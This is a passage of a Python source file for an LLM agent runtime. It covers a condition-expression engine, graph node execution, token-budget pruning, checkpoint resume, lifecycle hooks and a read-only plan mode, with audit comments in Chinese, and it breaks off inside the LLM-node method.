"""Agent Runtime Engine — state machine that drives the agent execution loop.

The runtime coordinates the LLM -> tool -> observe -> decide cycle,
calling fusion-mlx via HTTP API for LLM inference and executing tools
locally. Supports streaming, condition expressions, variable interpolation,
debugger hooks, structured output, and sub-graph execution.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import time
from typing import TYPE_CHECKING, Any, AsyncIterator

from .compactor import Compactor
from .context import AgentContext, AgentEvent, AgentEventType
from .debugger import StepDebugger
from .graph import AgentGraph, NodeConfig
from .json_schema import JsonSchemaValidator
from .llm_gateway import LLMGateway
from .prompt_templates import PromptTemplateManager
from .sub_graph import SubGraphRegistry
from .token_budget import TokenBudget
from .trajectory_writer import get_trajectory_writer
from .variable_manager import VariableManager

if TYPE_CHECKING:
    from server.fusion_mlx_client import FusionMLXClient
    from tools.base import BaseTool
    from tools.registry import ToolRegistry

    from .memory_engine import MemoryEngine
    from .persistence import AgentStore
    from .safety import SafetyGateway

from tools.plan_tools import EXIT_PLAN_MODE_SENTINEL

logger = logging.getLogger(__name__)

_MAX_TOOL_CALL_CHAIN = 10
_MAX_RETRY_CONTEXT_MESSAGES = 20


def _env_flag(name: str, default: bool = False) -> bool:
    """Parse a boolean env var: 1/true/yes/on (case-insensitive) => True."""
    raw = os.environ.get(name, "")
    if not raw:
        return default
    return raw.strip().lower() in ("1", "true", "yes", "on")


def _max_sub_graph_depth() -> int:
    # 审计 E-16: 子图递归深度上限. 默认 8, FUSION_SUB_GRAPH_MAX_DEPTH 调.
    raw = os.environ.get("FUSION_SUB_GRAPH_MAX_DEPTH", "").strip()
    try:
        val = int(raw) if raw else 8
        return val if val > 0 else 8
    except ValueError:
        return 8


class ConditionEngine:
    """Evaluates condition expressions against agent context.

    Supports:
    - Boolean literals: true, false
    - Context checks: has_tool_calls, has_error, has_result
    - Comparisons: iteration >= N, token_count > N, etc.
    - Variable references: {{ var }} comparisons
    - Logical operators: and, or, not
    - String containment: "text" in content
    """

    def evaluate(self, expr: str, ctx: AgentContext, variables: VariableManager) -> str:
        expr = expr.strip()
        if not expr:
            return "false"

        expr_lower = expr.lower()

        if expr_lower == "true":
            return "true"
        if expr_lower == "false":
            return "false"

        if re.search(r"\bor\b", expr_lower):
            parts = re.split(r"\s+or\s+", expr, flags=re.IGNORECASE)
            return (
                "true"
                if any(self.evaluate(p, ctx, variables) == "true" for p in parts)
                else "false"
            )

        if re.search(r"\band\b", expr_lower):
            parts = re.split(r"\s+and\s+", expr, flags=re.IGNORECASE)
            return (
                "true"
                if all(self.evaluate(p, ctx, variables) == "true" for p in parts)
                else "false"
            )

        if expr_lower.startswith("not "):
            inner = self.evaluate(expr[4:], ctx, variables)
            return "false" if inner == "true" else "true"

        if expr_lower == "has_tool_calls":
            for msg in reversed(ctx.messages):
                if isinstance(msg, dict) and msg.get("tool_calls"):
                    return "true"
            return "false"

        if expr_lower == "has_error":
            return "true" if ctx.error else "false"

        if expr_lower == "has_result":
            for msg in reversed(ctx.messages):
                if isinstance(msg, dict) and msg.get("role") == "tool":
                    return "true"
            return "false"

        comp_match = re.match(r"(\w+)\s*(>=|<=|!=|==|>|<)\s*(.+)", expr)
        if comp_match:
            left_name = comp_match.group(1)
            op = comp_match.group(2)
            right_raw = comp_match.group(3).strip()
            left_val = self._resolve_value(left_name, ctx, variables)
            right_val = self._resolve_literal(right_raw, variables)
            return self._compare(left_val, op, right_val)

        in_match = re.match(r'["\'](.+?)["\']\s+in\s+(\w+)', expr)
        if in_match:
            needle = in_match.group(1)
            haystack_name = in_match.group(2)
            haystack_val = str(self._resolve_value(haystack_name, ctx, variables))
            return "true" if needle in haystack_val else "false"

        var_val = variables.get(expr, "")
        if var_val:
            return "true" if var_val else "false"

        return "false"

    def _resolve_value(self, name: str, ctx: AgentContext, variables: VariableManager) -> Any:
        if name == "iteration":
            return ctx.iteration_count
        if name == "token_count":
            usage = ctx.token_usage()
            return usage.get("total", 0)
        if name == "prompt_tokens":
            return ctx.token_usage().get("prompt_tokens", 0)
        if name == "completion_tokens":
            return ctx.token_usage().get("completion_tokens", 0)
        if name == "message_count":
            return len(ctx.messages)
        if name == "error":
            return ctx.error
        var_val = variables.get(name, None)
        if var_val is not None:
            return var_val
        return 0

    def _resolve_literal(self, raw: str, variables: VariableManager) -> Any:
        raw = raw.strip()
        if raw.startswith("{{") and raw.endswith("}}"):
            var_name = raw[2:-2].strip()
            return variables.get(var_name, 0)
        if raw.startswith('"') or raw.startswith("'"):
            return raw[1:-1]
        # #212: bool 字面量归一 (大小写不敏感) -> Python bool, 否则裸 "true" 串
        # 与工具输出的 Python bool 比较永远判假.
        low = raw.lower()
        if low == "true":
            return True
        if low == "false":
            return False
        try:
            return int(raw)
        except ValueError:
            pass
        try:
            return float(raw)
        except ValueError:
            pass
        return raw

    @staticmethod
    def _coerce_pair(left: Any, right: Any) -> tuple[Any, Any]:
        # #212: 跨类型比较归一. 工具输出 Python bool/int, condition 字面量可能
        # 是 "true"/"5" 字符串 -> 严格相等永远假. 归一两边同类型再比.
        # bool 先于 int (bool 是 int 子类), 避免被 int 分支吞掉.
        if isinstance(left, bool) or isinstance(right, bool):
            if isinstance(left, bool) and isinstance(right, bool):
                return left, right
            if isinstance(left, bool) and isinstance(right, str):
                rl = right.strip().lower()
                if rl == "true":
                    return left, True
                if rl == "false":
                    return left, False
            if isinstance(right, bool) and isinstance(left, str):
                ll = left.strip().lower()
                if ll == "true":
                    return True, right
                if ll == "false":
                    return False, right
            return left, right
        # 数字串 vs 数字: "5" == 5, "5" >= 3
        if isinstance(left, (int, float)) and isinstance(right, str):
            try:
                return left, float(right) if "." in right else int(right)
            except ValueError:
                return left, right
        if isinstance(right, (int, float)) and isinstance(left, str):
            try:
                return float(left) if "." in left else int(left), right
            except ValueError:
                return left, right
        return left, right

    def _compare(self, left: Any, op: str, right: Any) -> str:
        # #212: 先归一再比, 避免跨类型严格相等静默判假.
        left, right = self._coerce_pair(left, right)
        try:
            if op == "==":
                return "true" if left == right else "false"
            if op == "!=":
                return "true" if left != right else "false"
            if op == ">=":
                return "true" if left >= right else "false"
            if op == "<=":
                return "true" if left <= right else "false"
            if op == ">":
                return "true" if left > right else "false"
            if op == "<":
                return "true" if left < right else "false"
        except TypeError:
            return "false"
        return "false"


class AgentRuntime:
    """Agent runtime engine — state machine driving the agent execution loop.

    Integrates debugger, variables, structured output, prompt templates,
    sub-graph execution, and streaming support.
    """

    def __init__(
        self,
        mlx_client: "FusionMLXClient | None" = None,
        tool_registry: "ToolRegistry | None" = None,
        max_iterations: int = 25,
        debugger: StepDebugger | None = None,
        variables: VariableManager | None = None,
        templates: PromptTemplateManager | None = None,
        sub_graphs: SubGraphRegistry | None = None,
        condition_engine: ConditionEngine | None = None,
        llm_gateway: LLMGateway | None = None,
        safety_gateway: "SafetyGateway | None" = None,
        store: "AgentStore | None" = None,
        auto_checkpoint: bool = False,
        memory_engine: "MemoryEngine | None" = None,
        artifact_manager: Any = None,
        telemetry_engine: Any = None,
    ):
        self.mlx = mlx_client
        self.tools = tool_registry
        self.max_iterations = max_iterations
        self.debugger = debugger
        self.variables = variables or VariableManager()
        self.templates = templates or PromptTemplateManager()
        self.sub_graphs = sub_graphs or SubGraphRegistry()
        self.condition_engine = condition_engine or ConditionEngine()
        self.safety_gateway = safety_gateway
        self.store = store
        self.auto_checkpoint = auto_checkpoint
        self.memory_engine = memory_engine
        self.artifact_manager = artifact_manager
        # C13: 结构化遥测引擎 (span/counter/latency). 运行时插桩
        # graph.execute/llm.call/tool.call span, end_span 增计数+延迟.
        self.telemetry_engine = telemetry_engine
        self.compactor = None
        self.hooks = None
        self._tool_call_chain_count = 0
        # 审计 M-3: 连续 checkpoint 失败计数, 超阈值升级 error (恢复特性静默失效,
        # 用户以为有 checkpoint 可恢复, 实际全程 save 都在失败).
        self._checkpoint_fail_count = 0
        self._safety_futures: dict[str, asyncio.Future[bool]] = {}
        self._safety_timeout: float = 60.0
        # 审计 A-1 Tier1: exec_id -> {action_id/plan_id} 反向索引. future 创建时
        # 记录归属 exec, exec 结束/异常时 reap 该 exec 残留 future (timeout 路径
        # 异常 skip pop 的兜底). 不清别 exec 的 future (并发安全).
        self._exec_future_keys: dict[str, set[str]] = {}
        self.tool_configs: dict[str, dict[str, Any]] = {}
        # C6 plan-as-mode: when True, write tools are gated off (read-only
        # explore phase). Flipped to False by exit_plan_mode tool call or by
        # graph.plan_mode at dispatch entry. _plan_futures blocks planner
        # nodes awaiting approval (mirrors _safety_futures pattern).
        self.plan_mode: bool = False
        self._plan_futures: dict[str, asyncio.Future[bool]] = {}
        # 审计 E-16/P0-4: 子图递归深度计数器. 无上限 -> 含子图循环引用 (A 子图
        # 指向 B, B 指向 A, 含无意构建) 触发无限递归 RecursionError 栈溢出崩溃
        # 整个 runtime 进程. 顶层执行 depth=0, 每进一层子图 +1, 超 _MAX_SUB_GRAPH_DEPTH
        # (默认 8, FUSION_SUB_GRAPH_MAX_DEPTH 调) 挡并报错.
        self._sub_graph_depth: int = 0
        # Read-only tools allowed during plan_mode. Write tools are blocked.
        self._plan_readonly_tools: set[str] = {
            "file_read",
            "file_list",
            "file_grep",
            "file_glob",
            "text_search",
            "text_process",
            "exit_plan_mode",
        }
        # 审计 D-5: register_tool/unregister_tool 是写操作 (注册工具 + 经
        # tool.register_python RPC 可 exec 源码), 不属于只读探索. 已移出
        # _plan_readonly_tools, plan_mode 只读期一并被挡, 与其他写工具一致.
        # Issue #149: optional per-node model unload to lower peak memory on
        # multi-model workflow chains. Default OFF to preserve model reuse
        # across consecutive same-model nodes. Env:
        # FUSION_AGENT_UNLOAD_MODEL_AFTER_NODE=1/true/yes enables it.
        self.unload_model_after_node = _env_flag(
            "FUSION_AGENT_UNLOAD_MODEL_AFTER_NODE", default=False
        )

        if llm_gateway:
            self.llm_gateway = llm_gateway
        elif mlx_client:
            gw = LLMGateway()
            gw.set_default_client(mlx_client)
            self.llm_gateway = gw
        else:
            self.llm_gateway = LLMGateway()

        self.compactor = Compactor(memory_engine=self.memory_engine)
        if hasattr(self.llm_gateway, "set_compactor"):
            self.llm_gateway.set_compactor(self.compactor)

        logger.info(
            "AgentRuntime init, mlx_client=%s, llm_gateway=%s",
            "provided" if mlx_client else "none",
            "provided" if llm_gateway else ("auto-from-mlx" if mlx_client else "empty"),
        )

    def set_tool_configs(self, definition: Any) -> None:
        # 声明式工具配置注入 (#125): 从 AgentDefinition.tools[].config 构建
        # tool_name -> config dict 映射, 工具执行时作为默认参数合并.
        configs: dict[str, dict[str, Any]] = {}
        tools = getattr(definition, "tools", None) or []
        for tc in tools:
            name = getattr(tc, "name", "") or ""
            cfg = getattr(tc, "config", None) or {}
            if name and isinstance(cfg, dict) and cfg:
                configs[name] = cfg
        self.tool_configs = configs
        logger.info("set_tool_configs: %d tools with config", len(configs))

    def _merge_tool_config_defaults(self, tool_name: str, args: dict) -> dict:
        # 把 manifest 声明的 tool.config 作为默认参数合并; 调用方显式传参优先.
        cfg = self.tool_configs.get(tool_name)
        if not cfg:
            return args
        merged = dict(cfg)
        if isinstance(args, dict):
            merged.update(args)
        logger.debug(
            "tool %s config defaults merged: %d keys, overrides=%d",
            tool_name,
            len(cfg),
            len(args) if isinstance(args, dict) else 0,
        )
        return merged

    async def execute_graph(
        self,
        graph: AgentGraph,
        initial_input: str = "",
        context: AgentContext | None = None,
        token_budget: TokenBudget | None = None,
    ) -> AsyncIterator[AgentEvent]:
        async for event in self._run_with_trajectory(
            graph, initial_input, context, token_budget, stream=False
        ):
            yield event

    async def execute_graph_stream(
        self,
        graph: AgentGraph,
        initial_input: str = "",
        context: AgentContext | None = None,
        token_budget: TokenBudget | None = None,
    ) -> AsyncIterator[AgentEvent]:
        async for event in self._run_with_trajectory(
            graph, initial_input, context, token_budget, stream=True
        ):
            yield event

    async def _run_with_trajectory(
        self,
        graph: AgentGraph,
        initial_input: str = "",
        context: AgentContext | None = None,
        token_budget: TokenBudget | None = None,
        stream: bool = False,
    ) -> AsyncIterator[AgentEvent]:
        ctx = context or AgentContext()
        writer = get_trajectory_writer()
        trace_id = writer.start(
            session_id=ctx.session_id,
            graph_id=getattr(graph, "graph_id", ""),
            graph_name=graph.name,
            agent_id=getattr(ctx, "agent_id", ""),
            max_iterations=self.max_iterations,
        )
        logger.debug(
            "trajectory trace=%s session=%s graph=%s stream=%s",
            trace_id,
            ctx.session_id,
            graph.name,
            stream,
        )
        # C13: 结构化遥测 — graph.execute span. trace_id 复用 trajectory 关联.
        tele_span = None
        if self.telemetry_engine is not None:
            try:
                tele_span = self.telemetry_engine.start_span(
                    "graph.execute",
                    trace_id=trace_id,
                    attributes={"graph_name": graph.name, "stream": stream},
                )
            except Exception as e:
                logger.warning("telemetry start_span graph.execute failed: %s", e)
        status = "completed"
        try:
            async for event in self._execute_graph_inner(
                graph, initial_input, context, token_budget, stream=stream
            ):
                writer.record_event(ctx.session_id, event.to_dict())
                if event.type == AgentEventType.ERROR:
                    status = "error"
                if event.type == AgentEventType.START:
                    writer.record_iteration(ctx.session_id, getattr(ctx, "iteration_count", 0))
                yield event
        except Exception:
            status = "error"
            raise
        finally:
            try:
                ctx_ref = context or ctx
                # 审计 A-1 Tier1: 清本 exec 残留 future (兜底异常路径).
                try:
                    self._reap_exec_futures(ctx_ref.session_id)
                except Exception as e:
                    logger.warning("A-1 reap_exec_futures failed: %s", e)
                writer.record_messages(
                    ctx_ref.session_id,
                    [m if isinstance(m, dict) else dict(m) for m in ctx_ref.messages],
                )
                usage = ctx_ref.token_usage() if hasattr(ctx_ref, "token_usage") else {}
                if usage:
                    writer.record_token_usage(ctx_ref.session_id, usage)
                writer.flush(ctx_ref.session_id, status=status)
            except (OSError, ValueError, TypeError) as e:
                logger.warning("trajectory flush failed: %s", e)
            if tele_span is not None and self.telemetry_engine is not None:
                try:
                    self.telemetry_engine.end_span(tele_span.span_id, status=status)
                except Exception as e:
                    logger.warning("telemetry end_span graph.execute failed: %s", e)

    async def _execute_graph_inner(
        self,
        graph: AgentGraph,
        initial_input: str = "",
        context: AgentContext | None = None,
        token_budget: TokenBudget | None = None,
        stream: bool = False,
    ) -> AsyncIterator[AgentEvent]:
        ctx = context or AgentContext()
        ctx.started_at = time.time()
        ctx.max_iterations = self.max_iterations
        # 审计 A-1: per-exec 状态迁 ctx, 不在 singleton 实例上 reset.
        # _tool_call_chain_count per-exec -> ctx (见 Tier 2).
        ctx.tool_call_chain_count = 0
        # 审计 A-1 Tier1: 跨 RPC future 注册表 keyed by globally-unique
        # action_id/plan_id, 并发安全本自带. 原代码 .clear() 会清掉并发
        # 执行 A 在途的 approval future (B 一启动把 A 的挂死). 移除 clear,
        # future 自身 pop 自清 (resolve/timeout/complete). exec 级 reaper
        # 守卫异常路径残留 (见 _register_exec_future/_reap_exec_futures).
        exec_id = ctx.session_id
        self._exec_future_keys.setdefault(exec_id, set())
        # C6: honor graph-level plan_mode flag at dispatch entry.
        # 审计 A-1 Tier2: plan_mode per-exec -> ctx, 不写 singleton.
        # graph.plan_mode True -> 强制只读 (子图也逃不掉). False 且 context
        # 由调用方提供 (子 runtime/并行分支) -> 继承调用方 ctx.plan_mode
        # (父只读期子分支也只读). False 且无 context (顶层 exec) -> 默认 False.
        if getattr(graph, "plan_mode", False):
            ctx.plan_mode = True
            logger.info("Graph %s entered plan_mode (read-only explore)", graph.id)
        elif context is None:
            ctx.plan_mode = False
        # 审计 A-1/A-2 Tier3: variables per-exec. ctx.variables 为空时从
        # runtime seed (self.variables) 快照 copy — 隔离不共享, 并发/sub
        # 互不污染. sub runtime 把 sub_vars 传进 ctor (self.variables=sub_vars),
        # 子 dispatch 再 copy 进 sub_ctx, 父 self.variables 全程不被写.
        self._seed_ctx_variables(ctx)

        errors = graph.validate()
        if errors:
            ctx.error = "; ".join(errors)
            yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
            return

        yield AgentEvent(type=AgentEventType.START, content=f"Starting: {graph.name}")

        # Issue #175: lifecycle hook — session start.
        await self._fire_tool_hooks(
            "SESSION_START",
            "",
            {"graph_id": graph.id, "graph_name": graph.name},
        )

        initial_input = ctx.variables.interpolate(initial_input)
        ctx.add_message("user", initial_input)

        # Issue #175: lifecycle hook — user prompt submitted.
        await self._fire_tool_hooks(
            "USER_PROMPT_SUBMIT",
            "",
            {"input": initial_input, "graph_id": graph.id},
        )

        if self.memory_engine and initial_input:
            mem_ctx = await asyncio.to_thread(self.memory_engine.recall_relevant, initial_input, 5)
            if mem_ctx:
                ctx.add_message("system", f"[Relevant memory]: {mem_ctx}")
                logger.info("Auto-loaded memory for input")

        start_node = graph.get_node(graph.start_node_id)
        system_prompt = ""
        if start_node:
            system_prompt = start_node.system_prompt
            if system_prompt:
                system_prompt = ctx.variables.interpolate(system_prompt)

        has_llm_nodes = any(n.type == "llm" for n in graph.nodes.values())
        model = graph.find_llm_model()
        if has_llm_nodes and not model:
            ctx.error = "No LLM model configured in graph"
            yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
            return

        tools_schema = self.tools.to_openai_schemas()
        if any(n.allow_dynamic_tools for n in graph.nodes.values()):
            tools_schema.extend(self._dynamic_tool_schemas())

        current_node_id = graph.start_node_id
        ctx.current_node_id = current_node_id

        while current_node_id and not ctx.is_max_iterations_reached():
            node = graph.get_node(current_node_id)
            if not node:
                ctx.error = f"Node '{current_node_id}' not found"
                yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
                return

            ctx.iteration_count += 1
            ctx.current_node_id = current_node_id

            if self.debugger:
                await self.debugger.check_pause(current_node_id, ctx.variables.to_dict())

            if node.type == "start":
                next_id = graph.get_next_node(current_node_id)
                current_node_id = next_id or ""
                continue

            elif node.type == "llm":
                async for event in self._execute_llm_node(
                    ctx, node, graph, model, tools_schema, system_prompt, stream=stream
                ):
                    yield event
                    if event.type == AgentEventType.ERROR:
                        return

                if self.auto_checkpoint:
                    await self._save_checkpoint(ctx, graph)

                if token_budget:
                    usage = ctx.token_usage()
                    token_budget.record_usage(
                        usage.get("prompt_tokens", 0), usage.get("completion_tokens", 0)
                    )
                    # Proactive context pruning at 70% budget
                    if (
                        token_budget.max_tokens > 0
                        and token_budget.spent_tokens >= int(token_budget.max_tokens * 0.7)
                        and self.compactor
                    ):
                        if not getattr(ctx, "_pruning_done", False):
                            ctx._pruning_done = True
                            artifact_tokens = 0
                            if self.artifact_manager:
                                try:
                                    budget_info = self.artifact_manager.get_context_budget(
                                        agent_id=getattr(ctx, "agent_id", "")
                                    )
                                    artifact_tokens = budget_info.get("total_tokens", 0)
                                except (ValueError, TypeError, RuntimeError, OSError):
                                    pass
                            logger.info(
                                "Proactive context pruning at %d/%d tokens (70%% threshold), artifact_tokens=%d",
                                token_budget.spent_tokens,
                                token_budget.max_tokens,
                                artifact_tokens,
                            )
                            await self._fire_tool_hooks(
                                "PRE_COMPACT",
                                "",
                                {
                                    "graph_id": graph.id,
                                    "node_id": node.label or "",
                                    "reason": "token_budget_pruning",
                                },
                            )
                            await self.compactor.compact(ctx.messages)
                            yield AgentEvent(
                                type=AgentEventType.THINK,
                                content="Context proactively pruned at 70% budget",
                                metadata={
                                    "pruning_threshold": 0.7,
                                    "artifact_tokens": artifact_tokens,
                                },
                            )
                    if token_budget.is_exceeded():
                        mode = "stream" if stream else "batch"
                        logger.warning(
                            "Token budget exceeded (%s): %d/%d",
                            mode,
                            token_budget.spent_tokens,
                            token_budget.max_tokens,
                        )
                        yield AgentEvent(
                            type=AgentEventType.TOKEN_BUDGET_EXCEEDED,
                            content=f"Token budget exceeded: {token_budget.spent_tokens}/{token_budget.max_tokens}",
                            metadata=token_budget.status(),
                        )
                        ctx.finished_at = time.time()
                        return

                # Agent Loop: 内生多轮工具回灌 (loop_mode=="agent")
                # 末条为 tool 结果 => stop_reason=tool_use, 回灌 LLM 继续推理
                if node.loop_mode == "agent":
                    max_iter = node.max_loop_iterations or 25
                    for loop_i in range(max_iter):
                        last_msg = ctx.messages[-1] if ctx.messages else {}
                        if last_msg.get("role") != "tool":
                            break
                        # Compaction 接入点 (M2): 超阈值先压缩再回灌
                        if self.compactor is not None:
                            level = self.compactor.should_compact(ctx.messages)
                            if level != "none":
                                before = len(ctx.messages)
                                # Issue #175: lifecycle hook — pre-compact.
                                await self._fire_tool_hooks(
                                    "PRE_COMPACT",
                                    "",
                                    {
                                        "graph_id": graph.id,
                                        "node_id": current_node_id,
                                        "before": before,
                                        "level": level,
                                    },
                                )
                                ctx.messages = self.compactor.compact(ctx.messages, level)
                                logger.info(
                                    "compaction applied level=%s before=%d after=%d node=%s",
                                    level,
                                    before,
                                    len(ctx.messages),
                                    current_node_id,
                                )
                        # Hooks 接入点 (M3)
                        ctx.tool_call_chain_count = 0
                        logger.info(
                            "agent loop iter=%d/%d node=%s msgs=%d",
                            loop_i + 1,
                            max_iter,
                            current_node_id,
                            len(ctx.messages),
                        )
                        async for event in self._execute_llm_node(
                            ctx,
                            node,
                            graph,
                            model,
                            tools_schema,
                            system_prompt,
                            stream=stream,
                        ):
                            yield event
                            if event.type == AgentEventType.ERROR:
                                return
                        if self.auto_checkpoint:
                            await self._save_checkpoint(ctx, graph)
                    else:
                        logger.warning(
                            "agent loop max iterations reached: %d node=%s",
                            max_iter,
                            current_node_id,
                        )
                        # Issue #175: lifecycle hook — stop (agent-loop cap).
                        await self._fire_tool_hooks(
                            "STOP",
                            "",
                            {
                                "graph_id": graph.id,
                                "node_id": current_node_id,
                                "reason": "agent_loop_max",
                            },
                        )

                last_msg = ctx.messages[-1] if ctx.messages else {}
                if last_msg.get("tool_calls"):
                    pass
                else:
                    ctx.tool_call_chain_count = 0
                    # Issue #149: optional per-node model unload. Only fire
                    # when the node is fully done (advancing to the next
                    # node), never during tool-call re-entry on the same
                    # node. Non-fatal: a failed/already-evicted unload is a
                    # warning, not a workflow error.
                    if self.unload_model_after_node:
                        served_model = node.model or model
                        if served_model:
                            await self.llm_gateway.unload_model(served_model)
                    next_id = graph.get_next_node(current_node_id)
                    current_node_id = next_id or ""

            elif node.type == "tool":
                async for event in self._execute_tool_node(ctx, node, graph):
                    yield event
                    if event.type == AgentEventType.ERROR:
                        return

                if self.auto_checkpoint:
                    await self._save_checkpoint(ctx, graph)

                next_id = graph.get_next_node(current_node_id)
                current_node_id = next_id or ""

            elif node.type == "condition":
                event = self._execute_condition_node(ctx, node)
                yield event
                current_node_id = (
                    graph.get_next_node(current_node_id, condition_result=event.content) or ""
                )

            elif node.type == "loop":
                event = self._execute_loop_node(ctx, node, graph)
                yield event
                if event.content == "loop_continue":
                    loop_start = node.tool_params.get("loop_start_node", "")
                    if loop_start and graph.get_node(loop_start):
                        current_node_id = loop_start
                    else:
                        next_id = graph.get_next_node(current_node_id)
                        current_node_id = next_id or ""
                else:
                    next_id = graph.get_next_node(current_node_id)
                    current_node_id = next_id or ""

            elif node.type == "error_handler":
                async for event in self._execute_error_handler_node(ctx, node, graph):
                    yield event
                next_id = graph.get_next_node(current_node_id)
                current_node_id = next_id or ""

            elif node.type == "rag":
                async for event in self._execute_rag_node(
                    ctx, node, graph, model, tools_schema, system_prompt, stream=stream
                ):
                    yield event
                    if event.type == AgentEventType.ERROR:
                        return
                next_id = graph.get_next_node(current_node_id)
                current_node_id = next_id or ""

            elif node.type == "planner":
                async for event in self._execute_planner_node(ctx, node, graph):
                    yield event
                    if event.type == AgentEventType.ERROR:
                        return
                next_id = graph.get_next_node(current_node_id)
                current_node_id = next_id or ""

            elif node.type == "verify":
                async for event in self._execute_verify_node(ctx, node, graph):
                    yield event
                    if event.type == AgentEventType.ERROR:
                        return
                next_id = graph.get_next_node(current_node_id)
                current_node_id = next_id or ""

            elif node.type == "parallel":
                async for ev in self._execute_parallel_node(
                    ctx, node, graph, current_node_id, stream=stream
                ):
                    yield ev
                    if ev.type == AgentEventType.ERROR:
                        return
                next_id = ev.metadata.get("next_id", "") if ev.metadata else ""
                current_node_id = next_id

            elif node.type == "end":
                yield AgentEvent(type=AgentEventType.END, content="Graph execution complete")
                ctx.finished_at = time.time()
                await self._auto_store_memory(ctx, graph)
                # Issue #175: lifecycle hook — session end (clean completion).
                await self._fire_tool_hooks(
                    "SESSION_END",
                    "",
                    {"graph_id": graph.id, "status": "completed"},
                )
                return

            else:
                # 审计 L-1: 未知 node.type 原本无 else 分支 — 不匹配任何
                # elif 时静默跳过, current_node_id 不更新, while 循环空转
                # 至 max_iterations 才报错, 既浪费又误导 (报 "max iterations"
                # 而非 "unknown node type"). 现显式报错并终止.
                ctx.error = (
                    f"Unknown node type '{node.type}' on node '{node.label}' "
                    f"(id={current_node_id})"
                )
                logger.error("unknown node type=%s node=%s id=%s", node.type, node.label, current_node_id)
                yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error, node_id=node.label)
                return

        if ctx.is_max_iterations_reached():
            ctx.error = "Max iterations exceeded"
            yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
            # Issue #175: lifecycle hook — stop (iteration cap reached).
            await self._fire_tool_hooks(
                "STOP",
                "",
                {"graph_id": graph.id, "reason": "max_iterations"},
            )

        ctx.finished_at = time.time()
        await self._auto_store_memory(ctx, graph)

    @staticmethod
    def _detect_unclosed_artifacts(content: str) -> list[str]:
        opens = re.findall(r'<artifact[^>]*\bid=["\']([^"\']+)["\']', content)
        closes = re.findall(r"</artifact>", content)
        if len(opens) > len(closes):
            return opens[len(closes) :]
        tag_opens = len(re.findall(r"<artifact-ref[^>]*>", content))
        tag_closes = len(re.findall(r"</artifact-ref>", content))
        if tag_opens > tag_closes:
            return re.findall(r'<artifact-ref[^>]*\bid=["\']([^"\']+)["\']', content)[tag_closes:]
        return []

    @staticmethod
    def _extract_breakpoint(content: str) -> str:
        paragraphs = [p.strip() for p in content.split("\n\n") if p.strip()]
        if paragraphs:
            last = paragraphs[-1]
            return last[:300]
        lines = content.strip().split("\n")
        if lines:
            return lines[-1][:300]
        return content[-300:]

    async def _save_checkpoint(self, ctx: AgentContext, graph: AgentGraph) -> None:
        """Auto-save checkpoint if store is configured."""
        if not self.store:
            return
        try:
            self.store.save_checkpoint(
                graph_id=graph.name,
                session_id=ctx.session_id,
                node_id=ctx.current_node_id or "",
                state={
                    "messages": ctx.messages,
                    "iteration_count": ctx.iteration_count,
                    "variables": ctx.variables.to_dict(),
                    "tool_call_chain_count": ctx.tool_call_chain_count,
                },
            )
            logger.debug("Checkpoint saved: graph=%s node=%s", graph.name, ctx.current_node_id)
            self._checkpoint_fail_count = 0
        except Exception as e:
            self._checkpoint_fail_count += 1
            # 审计 M-3: 持续失败 (DB 满/锁/schema 不匹配) 仅 warning 但执行照常,
            # 之后 resume 报 "No checkpoint found" 用户无信号. 连续 3 次升级 error.
            if self._checkpoint_fail_count >= 3:
                logger.error(
                    "Checkpoint save failed %d consecutive times (resume will not work): %s",
                    self._checkpoint_fail_count, e,
                )
            else:
                logger.warning("Checkpoint save failed (%d): %s", self._checkpoint_fail_count, e)

    async def resume_from_checkpoint(
        self,
        graph: AgentGraph,
        session_id: str,
        stream: bool = False,
    ) -> AsyncIterator[AgentEvent]:
        """Resume graph execution from the latest checkpoint."""
        if not self.store:
            yield AgentEvent(
                type=AgentEventType.ERROR,
                content="No store configured for checkpoint resume",
            )
            return

        checkpoint = self.store.load_latest_checkpoint(graph_id=graph.name, session_id=session_id)
        if not checkpoint:
            yield AgentEvent(
                type=AgentEventType.ERROR,
                content=f"No checkpoint found for graph={graph.name} session={session_id}",
            )
            return

        ctx = AgentContext(session_id=session_id)
        # 审计 E-20: Checkpoint 是 dataclass 非 dict, 用属性 + 解析 state_json.
        raw_state = checkpoint.context_json or "{}"
        try:
            state = json.loads(raw_state) if raw_state else {}
        except (json.JSONDecodeError, TypeError):
            state = {}
        ctx.messages = state.get("messages", [])
        ctx.iteration_count = state.get("iteration_count", 0)
        ctx.current_node_id = checkpoint.current_node_id or graph.start_node_id
        ctx.tool_call_chain_count = state.get("tool_call_chain_count", 0)
        # 审计 A-1 Tier3: resume 重建 per-exec variables (fresh VM + 载入快照),
        # 不写回 singleton self.variables. dispatch 见 context 提供, 不 reseed.
        ctx.variables = VariableManager()

        saved_vars = state.get("variables", {})
        for k, v in saved_vars.items():
            ctx.variables.set(k, v)

        logger.info(
            "Resumed from checkpoint: graph=%s node=%s iteration=%d",
            graph.name,
            ctx.current_node_id,
            ctx.iteration_count,
        )

        yield AgentEvent(
            type=AgentEventType.CHECKPOINT,
            content=f"Resumed from checkpoint at node '{ctx.current_node_id}'",
            metadata={"checkpoint": checkpoint.to_dict()},
        )

        exec_fn = self.execute_graph_stream if stream else self.execute_graph
        async for event in exec_fn(graph, "", context=ctx):
            yield event

    async def _execute_llm_node(
        self,
        ctx: AgentContext,
        node: NodeConfig,
        graph: AgentGraph,
        model: str,
        tools_schema: list[dict],
        system_prompt: str,
        stream: bool = False,
    ) -> AsyncIterator[AgentEvent]:
        """Execute an LLM node — call fusion-mlx via HTTP API. Supports streaming."""
        # Issue #176: per-node model override. Graph-level model is a fallback;
        # an explicit node.model wins (matches rag/augmented-node pattern).
        if node.model and node.model != model:
            logger.info(
                "LLM node %s overriding graph model %s -> %s",
                node.label or "?",
                model,
                node.model,
            )
            model = node.model
        messages = []

        if node.disable_tools:
            tools_schema = None
            logger.info(
                "LLM node %s disable_tools=True, tool injection skipped",
                node.label,
            )

        node_prompt = node.system_prompt or system_prompt
        if node_prompt:
            template_name = self._extract_template_name(node_prompt)
            if template_name:
                try:
                    node_prompt = self.templates.render(template_name, **ctx.variables.to_dict())
                except KeyError:
                    pass
            node_prompt = ctx.variables.interpolate(node_prompt)
            messages.append({"role": "system", "content": node_prompt})

        if self.artifact_manager and hasattr(ctx, "agent_id"):
